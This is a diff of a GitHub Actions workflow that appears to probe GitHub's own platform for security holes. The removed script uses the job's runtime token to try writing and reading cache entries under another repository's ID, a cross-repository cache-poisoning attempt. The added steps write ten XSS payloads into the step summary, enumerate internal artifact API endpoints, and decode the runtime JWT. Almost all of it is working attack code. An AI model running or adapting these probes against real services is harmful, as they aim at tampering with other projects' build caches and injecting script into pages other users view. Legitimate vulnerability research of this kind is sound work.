@@ -1,155 +1,86 @@
-name: Cache Cross-Repo Probe v1
+name: Artifact Scope + Summary XSS Test
 on:
   workflow_dispatch:
 permissions:
   contents: read
   actions: read
 jobs:
-  cross-repo-cache:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/github-script@v7
+      - name: Step Summary XSS Probe
+        run: |
+          # Write XSS payloads to GITHUB_STEP_SUMMARY
+          cat >> "$GITHUB_STEP_SUMMARY" << 'EOF'
+          ## Summary XSS Probe
+          
+          Test 1: <img src=x onerror=alert(document.domain)>
+          Test 2: <script>alert(1)</script>
+          Test 3: <svg onload=alert(1)>
+          Test 4: [link](javascript:alert(1))
+          Test 5: <details open ontoggle=alert(1)><summary>click</summary>test</details>
+          Test 6: <iframe src="javascript:alert(1)">
+          Test 7: <a href="javascript:void(0)" onclick="alert(1)">click</a>
+          Test 8: <math><maction actiontype="statusline" xlink:href="javascript:alert(1)">click</maction></math>
+          Test 9: <input onfocus=alert(1) autofocus>
+          Test 10: <marquee onstart=alert(1)>
+          EOF
+          echo "Step summary written with 10 XSS probes"
+
+      - name: Artifact Twirp API Probe
+        uses: actions/github-script@v7
         with:
           script: |
-            const crypto = require('crypto');
             const env = process.env;
             const resultsUrl = env.ACTIONS_RESULTS_URL;
             const token = env.ACTIONS_RUNTIME_TOKEN;
-            const version = crypto.createHash('sha256').update('/tmp/probe|zstd').digest('hex');
-            const timestamp = Math.floor(Date.now()/1000);
-            const probeKey = `cross-scope-probe-${timestamp}`;
             
-            // Foreign repo = toofikz4/public-test-repo (ID 1187665821)
-            const foreignRepoId = '1187665821';
-            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
+            if (!resultsUrl || !token) {
+              console.log('Missing env vars');
+              return;
+            }
+            
             const headers = {
               'Authorization': `Bearer ${token}`,
               'Content-Type': 'application/json'
             };
             
-            console.log(`Probe key: ${probeKey}`);
-            console.log(`Version: ${version}`);
-            console.log(`Foreign repo ID: ${foreignRepoId}`);
+            // Check what artifact services exist at ACTIONS_RESULTS_URL
+            console.log('=== Artifact service discovery ===');
             
-            // Step 1: CreateCacheEntry with foreign repositoryId
-            console.log('\n=== Step 1: CreateCacheEntry with foreign repoId ===');
-            const createResp = await fetch(`${twirpBase}/CreateCacheEntry`, {
-              method: 'POST', headers,
-              body: JSON.stringify({
-                key: probeKey, version,
-                metadata: {
-                  repositoryId: foreignRepoId,
-                  scope: [{scope: 'refs/heads/main', permission: 3}]
+            // Try the artifact twirp service
+            const services = [
+              'github.actions.results.api.v1.ArtifactService',
+              'github.actions.results.api.v1.CacheService',
+              'github.actions.results.api.v2.ArtifactService',
+            ];
+            
+            for (const svc of services) {
+              const methods = ['CreateArtifact', 'ListArtifacts', 'GetSignedArtifactURL', 'FinalizeArtifact'];
+              for (const method of methods) {
+                const url = `${resultsUrl}twirp/${svc}/${method}`;
+                try {
+                  const resp = await fetch(url, {
+                    method: 'POST', headers,
+                    body: JSON.stringify({})
+                  });
+                  const text = await resp.text();
+                  if (resp.status !== 404) {
+                    console.log(`${svc}/${method}: ${resp.status} ${text.substring(0, 100)}`);
+                  }
+                } catch(e) {
+                  // skip
                 }
-              })
-            });
-            const createData = await createResp.json();
-            console.log(`Create status: ${createResp.status}`);
-            console.log(`Create ok: ${createData.ok}`);
-            
-            if (!createData.ok || !createData.signed_upload_url) {
-              console.log('Create failed, aborting');
-              return;
+              }
             }
             
-            const uploadUrl = createData.signed_upload_url;
-            console.log(`Upload URL host: ${new URL(uploadUrl).hostname}`);
-            console.log(`Upload URL path prefix: ${new URL(uploadUrl).pathname.substring(0, 30)}`);
-            
-            // Step 2: Upload data to the signed URL
-            console.log('\n=== Step 2: Upload probe data ===');
-            const probeData = `CROSS_SCOPE_PROBE_DATA_${timestamp}_FROM_TOOFORG`;
-            const uploadResp = await fetch(uploadUrl, {
-              method: 'PUT',
-              headers: {
-                'Content-Type': 'application/octet-stream',
-                'Content-Length': probeData.length.toString(),
-                'x-ms-blob-type': 'BlockBlob'
-              },
-              body: probeData
-            });
-            console.log(`Upload status: ${uploadResp.status}`);
-            if (uploadResp.status !== 201) {
-              console.log(`Upload body: ${await uploadResp.text()}`);
+            // Also check the workflow run backend ID from the token
+            try {
+              const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+              console.log(`\nOwn repo_id: ${payload.repository_id}`);
+              console.log(`Own orch_id: ${payload.orch_id}`);
+              console.log(`Own run_id: ${payload.run_id}`);
+              console.log(`Own job_id: ${payload.job_id}`);
+            } catch(e) {
+              console.log('JWT decode error:', e.message);
             }
-            
-            // Step 3: Finalize the cache entry
-            console.log('\n=== Step 3: FinalizeCacheEntryUpload ===');
-            const finalizeResp = await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
-              method: 'POST', headers,
-              body: JSON.stringify({
-                key: probeKey, version,
-                sizeBytes: probeData.length.toString(),
-                metadata: {
-                  repositoryId: foreignRepoId,
-                  scope: [{scope: 'refs/heads/main', permission: 3}]
-                }
-              })
-            });
-            const finalizeData = await finalizeResp.json();
-            console.log(`Finalize status: ${finalizeResp.status}`);
-            console.log(`Finalize ok: ${finalizeData.ok}`);
-            console.log(`Finalize data: ${JSON.stringify(finalizeData)}`);
-            
-            // Step 4: Verify - try to GET the cache entry with OWN repoId
-            console.log('\n=== Step 4: GET with own repoId ===');
-            const getOwnResp = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
-              method: 'POST', headers,
-              body: JSON.stringify({key: probeKey, version})
-            });
-            const getOwnData = await getOwnResp.json();
-            console.log(`Get own: ok=${getOwnData.ok}, matched_key=${getOwnData.matched_key}`);
-            
-            // Step 5: Verify - try to GET with FOREIGN repoId
-            console.log('\n=== Step 5: GET with foreign repoId ===');
-            const getForeignResp = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
-              method: 'POST', headers,
-              body: JSON.stringify({
-                key: probeKey, version,
-                metadata: {
-                  repositoryId: foreignRepoId,
-                  scope: [{scope: 'refs/heads/main', permission: 3}]
-                }
-              })
-            });
-            const getForeignData = await getForeignResp.json();
-            console.log(`Get foreign: ok=${getForeignData.ok}, matched_key=${getForeignData.matched_key}`);
-            
-            if (getForeignData.ok && getForeignData.signed_download_url) {
-              console.log('CRITICAL: Foreign repo cache entry accessible!');
-              console.log(`Download URL: ${getForeignData.signed_download_url.substring(0, 100)}...`);
-            }
-            
-            // Step 6: Also create with OWN repoId for comparison
-            console.log('\n=== Step 6: Create with OWN repoId for comparison ===');
-            const ownKey = `own-scope-probe-${timestamp}`;
-            const createOwnResp = await fetch(`${twirpBase}/CreateCacheEntry`, {
-              method: 'POST', headers,
-              body: JSON.stringify({key: ownKey, version})
-            });
-            const createOwnData = await createOwnResp.json();
-            console.log(`Create own: ok=${createOwnData.ok}`);
-            
-            if (createOwnData.ok) {
-              await fetch(createOwnData.signed_upload_url, {
-                method: 'PUT',
-                headers: {'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob'},
-                body: `OWN_SCOPE_DATA_${timestamp}`
-              });
-              await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
-                method: 'POST', headers,
-                body: JSON.stringify({key: ownKey, version, sizeBytes: '30'})
-              });
-              
-              const getOwnCreated = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
-                method: 'POST', headers,
-                body: JSON.stringify({key: ownKey, version})
-              });
-              const ownCreatedData = await getOwnCreated.json();
-              console.log(`Get own-created: ok=${ownCreatedData.ok}, matched_key=${ownCreatedData.matched_key}`);
-            }
-            
-            console.log('\n=== FINAL VERDICT ===');
-            console.log(`Foreign create: ${createData.ok ? 'ACCEPTED' : 'REJECTED'}`);
-            console.log(`Foreign finalize: ${finalizeData.ok ? 'ACCEPTED' : 'REJECTED'}`);
-            console.log(`Foreign GET: ${getForeignData.ok ? 'FOUND (CRITICAL!)' : 'NOT FOUND'}`);
